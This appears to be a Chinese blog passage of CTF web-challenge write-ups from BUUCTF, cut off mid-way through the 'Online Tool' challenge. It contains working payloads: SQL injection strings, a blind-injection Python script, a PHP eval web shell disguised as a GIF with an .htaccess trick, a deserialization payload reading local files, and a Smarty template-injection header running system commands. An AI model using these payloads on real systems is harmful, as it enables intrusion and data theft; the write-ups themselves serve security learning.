class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username = &#x27;$name&#x27;</span><br></pre></td></tr></table></figure><p>这里注入点在<code>name</code>上, 这里没有将<code>name</code>和<code>password</code>一起查询,那么应该是先通过<code>name</code>查询到对应的结果,将其中的<code>password</code>和用户输入的<code>password</code>相比较. 这里<code>select *</code>会返回相应用户名的所有数据</p><p><strong>那么可以使得<code>select * from user where username = &#39;$name&#39;</code>的结果为空,然后后面附加上<code>union select</code></strong></p><p><strong>这样整条查询语句的结果就是<code>union select</code>的结果,那么验证密码时就会错误地把<code>union select</code>对应位置上的值当成密码</strong></p><p>先测试<code>select *</code>结果的字段数:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">name=1&#x27; union select 1,2#&amp;pw=123</span><br><span class="line">返回:Error: The used SELECT statements have a different number of columns</span><br><span class="line">name=1&#x27; union select 1,2,3#&amp;pw=123</span><br><span class="line">返回:wrong user!</span><br><span class="line">这里说明结果有三列</span><br></pre></td></tr></table></figure><p>下面测试用户名在这三列中的哪个位置:(因为整个<code>union select</code>的结果都是伪造的,所以这里<code>admin</code>换成别的什么也一样)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name=1&#x27; union select 1,&#x27;admin&#x27;,3#&amp;pw=123</span><br><span class="line">返回:wrong pass!</span><br><span class="line">说明用户名在第二个位置</span><br></pre></td></tr></table></figure><p>那么尝试把密码也加上:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name=1&#x27; union select 1,&#x27;admin&#x27;,&#x27;admin&#x27;#&amp;pw=admin</span><br><span class="line">返回:wrong pass!</span><br><span class="line">这里并没有起作用,考虑一下密码经常用md5的形式存储,并且在密码中输入类似admin&#x27; 时也不会报错,那么应该是对用户输入的密码进行了md5处理.</span><br></pre></td></tr></table></figure><p>那么这里对<code>admin</code>进行<code>md5</code>处理,然后再填入密码的位置上:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name=1&#x27; union select 1,&#x27;admin&#x27;,&#x27;21232f297a57a5a743894a0e4a801fc3&#x27;#&amp;pw=admin</span><br><span class="line">返回:flag&#123;96c9a844-2281-40a2-be8b-8900ba1ff455&#125;</span><br></pre></td></tr></table></figure><br><hr><br><h1 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h1><p>直接把一句话木马改成图片格式,上传成功:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=&quot;php&quot;&gt; @eval($_POST[&#x27;a&#x27;]);&lt;/script&gt;</span><br><span class="line">/var/www/html/upload/5b17b3346cc2ba84ebe30b3bcaf6a1d9/scri.jpg succesfully uploaded!</span><br></pre></td></tr></table></figure><p>接下来考虑怎么样利用</p><p>尝试访问一下<code>上传目录/index.php</code>,看看有没有现成可用的<code>php文件</code>,如果有的话可以考虑用<code>.user.ini</code>对一句话木马文件进行包含. 并没有找到</p><p>那么试试上传<code>.htaccess</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;scri.jpg&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>应该是对文件类型进行了检测<img src="/image/buuctf-web/image-20221018085753152.png" alt="image-20221018085753152"></p><p>那么就抓包修改一下:</p><img src="/images/buuctf-web/image-20221018085916924-166704781973576.png" alt="image-20221018085916924" style="zoom:67%;" /><p>这次上传成功</p><p>蚁剑连接后在根目录找到flag</p><img src="/images/buuctf-web/image-20221018085958237-166704781973577.png" alt="image-20221018085958237" style="zoom:67%;" /><br><hr><br><h1 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or &#x27;1&#x27;=&#x27;1&#x27;#</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221018090848491-166704781973578.png" alt="image-20221018090848491" style="zoom:67%;" /><p>那么查询语句应该类似: <code>select id,name from 表名 where id = &#39;$输入&#39;;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入:1&#x27; union select version(),database()#</span><br><span class="line">返回了过滤内容</span><br><span class="line">return preg_match(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&quot;,$inject);</span><br></pre></td></tr></table></figure><p>那么使用<code>show</code>来进行注入:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;show databases;# 爆库名</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221018091315148-166704781973579.png" alt="image-20221018091315148" style="zoom:67%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;show tables;# 爆表名</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221018091417095-166704781973580.png" alt="image-20221018091417095" style="zoom:67%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;; show columns from FlagHere;# 爆列名</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221018091457650-166704781973581.png" alt="image-20221018091457650" style="zoom:67%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;handler FlagHere open;handler FlagHere read first; 读取数据</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221018091846885-166704781973582.png" alt="image-20221018091846885" style="zoom:67%;" /><br><hr><br><h1 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h1><p>经过测试,空格被过滤了,那么使用<strong>括号</strong>来代替</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=if(ascii(substr((select(flag)from(flag)),1,1))=102,1,0)   //ascii码102为f</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221018095142467.png" alt="image-20221018095142467" style="zoom:67%;" /><p>提交上述内容,返回了<code>id=1</code>时的结果 (如果<code>if</code>语句的值为1,则整体语句为<code>1=1</code>,值为<code>True</code>,也就会返回<code>id=1</code>时的查询内容,如果<code>if</code>语句的值为0,则整体语句为<code>1=0</code>,值为<code>False</code>)</p><blockquote><p><strong><code>sql</code>中的<code>if</code>语句: <code>IF( expr1 , expr2 , expr3 )</code></strong></p><p><strong>如果<code>exp1</code>的值为<code>True</code>,则返回<code>expr2</code></strong></p><p><strong>如果<code>exp1</code>的值为<code>False</code>,则返回<code>expr3</code></strong></p></blockquote><p>利用这一点,可以使用脚本来进行盲注</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">chars = <span class="string">&quot;qwertyuioplkjhgfdsazxcvbnm1234567890&#125;&#123;&quot;</span>  <span class="comment"># 返回所有可打印的字母，数字，符号的集合</span></span><br><span class="line"><span class="comment"># print(chars)</span></span><br><span class="line">base_url = <span class="string">&quot;http://38133c0f-4b3f-4bb9-b42b-e25804a8ce2b.node4.buuoj.cn:81/index.php&quot;</span></span><br><span class="line">session = requests.session()</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> chars:</span><br><span class="line">        time.sleep(<span class="number">1</span>) <span class="comment">#防止429</span></span><br><span class="line">        query = <span class="string">&#x27;1=if(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))=&#123;&#125;,1,0)&#x27;</span>.<span class="built_in">format</span>(i, <span class="built_in">ord</span>(c))</span><br><span class="line">        <span class="built_in">print</span>(query)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>: query</span><br><span class="line">        &#125;</span><br><span class="line">        response = session.post(base_url,data=data).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;glzjin&#x27;</span> <span class="keyword">in</span> response:</span><br><span class="line">            flag = flag+c</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><br><hr><br><h1 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h1><p>进去有一个注册页面,分别是<code>username</code>,<code>password</code>,<code>age</code>和<code>blog</code>三项,随便填写内容后提交显示<code>blog not valid</code></p><p>那这里<code>blog</code>可能是要填一个博客的网址,尝试填写<code>www.baidu.com</code>,注册通过</p><img src="/images/buuctf-web/image-20221018120804283-166704781973583.png" alt="image-20221018120804283" style="zoom:67%;" /><p>查看源码发现点击<code>username</code>那里的<code>abc</code>,会打开<code>view.php</code>,并传参<code>no</code>,这个<code>no</code>应该是用户的ID</p><img src="/images/buuctf-web/image-20221018120842828-166704781973584.png" alt="image-20221018120842828" style="zoom:67%;" /><p>点击后进入了用户信息界面,这里应该是<strong>后台进行了sql查询, 那么可能存在注入点.</strong>.</p><p>查看源码后这里发现了<code>base64</code>编码后的内容:</p><img src="/images/buuctf-web/image-20221018121149810.png" alt="image-20221018121149810" style="zoom:80%;" /><p>解码后发现是百度的源码,那么这里服务器根据<code>blog</code>中的网址去请求了网页的内容</p><p>那么同样地,如果这里填写<code>file://</code>这种读取本地文件的协议,应该也可以执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://004f0382-17c4-4956-ac3e-f59cd1962fa9.node4.buuoj.cn:81/join.php</span><br><span class="line">http://004f0382-17c4-4956-ac3e-f59cd1962fa9.node4.buuoj.cn:81/login.php</span><br></pre></td></tr></table></figure><p>直接在注册页提交的话会爆<code>not valid</code>无法通过:</p><img src="/images/buuctf-web/image-20221018152903248-166704781973585.png" alt="image-20221018152903248" style="zoom:67%;" /><p>测试一下<code>view.php</code>的<code>no</code>参数是否存在注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?no=1&#x27; or &#x27;1&#x27;=&#x27;1&#x27;#</span><br></pre></td></tr></table></figure><p>出现报错,说明存在注入漏洞, 下面尝试一下<code>union</code>,存在关键词过滤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?no=3 union select 1,2,3,4#</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221018122717667-166704781973586.png" alt="image-20221018122717667" style="zoom:67%;" /><p>经过测试,这里单独输入<code>1,</code>,<code>1union</code>,<code>1select</code>,等都会直接报错,而不会报<code>hack</code>,那么过滤关键词可能是<code>union select</code>,那么只要使用<code>/**/</code>来绕过空格就好了:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">no=3 union/**/select 1,2,3,4#</span><br></pre></td></tr></table></figure><p>可以看到这里爆了反序列化的错误:</p><img src="/images/buuctf-web/image-20221018123424162-166704781973587.png" alt="image-20221018123424162" style="zoom: 80%;" /><p>这里先尝试用<code>2</code>这个位置继续注入看看,多获得一些信息:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">no=3 union/**/select 1,database(),3,4#</span><br><span class="line">---库名: fakebook</span><br><span class="line">no=3 union/**/select 1,group_concat(TABLE_NAME),3,4 from information_schema.TABLES where table_schema=&#x27;fakebook&#x27;#</span><br><span class="line">---表名: users</span><br><span class="line">no=3 union/**/select 1,group_concat(COLUMN_NAME),3,4 from information_schema.COLUMNS where table_schema=&#x27;fakebook&#x27; and table_name=&#x27;users&#x27;#</span><br><span class="line">---列名: no,username,passwd,data</span><br><span class="line">no=3 union/**/select 1,group_concat(no,&#x27;,&#x27;,username,&#x27;,&#x27;,passwd,&#x27;,&#x27;,data),3,4 from users#</span><br><span class="line"></span><br><span class="line">输出:</span><br><span class="line">1,  //id</span><br><span class="line">abc,  //username</span><br><span class="line">cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce47d0d13c5d85f2b0ff8318d2877eec2f63b931bd47417a81a538327af927da3e, </span><br><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;abc&quot;;s:3:&quot;age&quot;;i:1234;s:4:&quot;blog&quot;;s:13:&quot;www.baidu.com&quot;;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里<code>data</code>输出的是一个可被反序列化的字符串, 那么还原一下这里的查询过程,应该是</p><p>传id值后, sql查询到此id对应的<code>data</code>字段值, 也就是序列化的字符串, 将这个字符串反序列化之后,将得到的各个属性值呈现在<code>view.php</code>的查询结果中,并且要去请求<code>blog</code>属性中的网址,返回网站内容</p><p><strong>这里访问<code>robots.txt</code>发现以下内容:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /user.php.bak //有一个备份文件</span><br></pre></td></tr></table></figure><p>访问并下载,打开后发现了源码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="variable language_">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里得到了<code>UserInfo</code>类的源码,可以以此来构造反序列化的字符串了</p><p>另外,注意到, 上面最后的注入结果中的有四个字段, 应该正好能对上<code>union select</code>后的四个位置,其中存储序列化字符串的<code>data</code>在最后一个</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;aaa&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">23</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;file:///var/www/html/flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">UserInfo</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//运行得到用于反序列化的字符串</span></span><br><span class="line"><span class="comment">//O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;aaa&quot;;s:3:&quot;age&quot;;i:23;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>构造payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?no=3 union/**/select 1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;aaa&quot;;s:3:&quot;age&quot;;i:23;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;</span><br></pre></td></tr></table></figure><p>查看源码得到编码后的flag,解码即可</p><img src="/images/buuctf-web/image-20221018130216720.png" alt="image-20221018130216720" style="zoom:67%;" /><br><hr><br><h1 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h1><p>进来是一个登录页面,下面有个help,点击结果显示找不到文件:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.io.FileNotFoundException:&#123;help.docx&#125;</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221018154244298-166704781973588.png" alt="image-20221018154244298" style="zoom:67%;" /><p>查看源码发现这里的连接是给<code>/Download</code>传一个<code>filename</code>参数,这里比较像文件包含了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Download?filename=help.docx</span><br></pre></td></tr></table></figure><p><code>GET</code>请求不到的话,把这里的参数换到POST中试试:</p><img src="/images/buuctf-web/image-20221018154521680-166704781973589.png" alt="image-20221018154521680" style="zoom:67%;" /><p>成功下载了<code>help.docx</code>,结果打开之后啥也不是…</p><img src="/images/buuctf-web/image-20221018154600400-166704781973590.png" alt="image-20221018154600400" style="zoom:67%;" /><p>但是此处的文件包含漏洞是确实存在的,可以尝试用它去下载一下其他文件</p><p>这里的网站是使用<code>JAVA</code>搭建的,这里可以尝试读取一下<code>WEB-INF</code>目录下面的文件,详见<a href="9076add.html">JAVA_web</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=WEB-INF/web.xml</span><br></pre></td></tr></table></figure><p>成功下载了<code>WEB-INF/web.xml</code></p><p>在该文件中找到了一个名为<code>FlagController</code>的类</p><img src="/images/buuctf-web/image-20221018160645549-166704781973591.png" alt="image-20221018160645549" style="zoom:67%;" /><p>先按照下面给的路径用浏览器访问一下试试: 这里爆了500错误,但是错误信息里给出了这个类的路径:</p><img src="/images/buuctf-web/image-20221018160755237-166704781973592.png" alt="image-20221018160755237" style="zoom:67%;" /><p>那么还是用刚才的方法下载该文件,注意的文件后缀名是<code>.class</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=WEB-INF/classes/com/wm/ctf/FlagController.class</span><br></pre></td></tr></table></figure><p>下载并打开后发现有一段<code>base64</code>编码: 解码后得到flag</p><img src="/images/buuctf-web/image-20221018161405168-166704781973593.png" alt="image-20221018161405168" style="zoom:67%;" /><br><hr><br><h1 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h1><p>左上角有三个链接,其中点击第一个是返回首页</p><img src="/images/buuctf-web/image-20221018162320664-166704781973594.png" alt="image-20221018162320664" style="zoom:67%;" /><p>点击<code>Flag</code>,显示:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Your IP is : 10.244.80.206 </span><br></pre></td></tr></table></figure><p>点击<code>Hint</code>然后查看源码: 有个没什么用的提示</p><img src="/images/buuctf-web/image-20221018162600950-166704781973596.png" alt="image-20221018162600950" style="zoom:67%;" /><p>那么这里尝试添加以下<code>XFF</code>头字段,看看页面显示的IP会不会发生变化: 确实</p><img src="/images/buuctf-web/image-20221018174802686-166704781973595.png" alt="image-20221018174802686" style="zoom:67%;" /><p>这里<code>XFF</code>字段的内容会被拼接到相应页面上,那么是否可以利用此来执行命令</p><p>这里的知识点是<code>SSTI</code>中的<code>smarty</code>模板注入,具体见<a href="47d18edd.html">SSTI</a></p><img src="/images/buuctf-web/image-20221018175617235-166704781973597.png" alt="image-20221018175617235" style="zoom:67%;" /><p>直接读取flag文件:</p><img src="/images/buuctf-web/image-20221018184357732-166704781973598.png" alt="image-20221018184357732" style="zoom:67%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For:&#123;system(&quot;cat /flag&quot;)&#125;</span><br></pre></td></tr></table></figure><br><hr><br><h1 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125; <span class="comment">//传XFF字段</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>])) &#123; <span class="comment">//GET传参数host</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$host</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$host</span>); <span class="comment">//对host字符串进行转码转义</span></span><br><span class="line">    <span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="title function_ invoke__">md5</span>(<span class="string">&quot;glzjin&quot;</span>. <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you are in sandbox &#x27;</span>.<span class="variable">$sandbox</span>;</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="variable">$host</span>);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// -sT，在目标主机的日志上记录大批连接请求和错误的信息</span></span><br><span class="line">    <span class="comment">// -Pn，扫描之前不需要用ping命令，有些防火墙禁止使用ping命令</span></span><br><span class="line">    <span class="comment">// -T5，时间优化参数，-T0~5，-T0扫描端口的周期大约为5分钟，-T5大约为5秒钟</span></span><br><span class="line">    